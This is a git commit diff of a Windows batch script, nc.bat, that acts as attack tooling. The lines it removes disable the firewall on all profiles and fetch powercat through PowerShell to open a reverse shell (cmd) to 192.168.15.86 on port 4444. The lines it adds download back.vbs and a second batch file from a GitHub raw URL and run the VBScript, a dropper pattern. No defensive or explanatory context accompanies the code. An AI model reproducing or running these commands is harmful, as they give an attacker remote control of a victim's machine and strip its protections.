45e8be71beebfe85a1b66177cf86aa3a35bf5f3c
Rafael Ferreira Pedrosa <rafaelfepedrosa@gmail.com>
2022-05-27 16:05:45 -0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -1,3 +1,4 @@
 cd %TEMP%
-netsh advfirewall set allprofiles state off
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.15.86/powercat.ps1');powercat -c 192.168.15.86 -p 4444 -e cmd"
+powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/back.vbs','back.vbs')
+powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/nc.bat2','nc.bat2')
+back.vbs
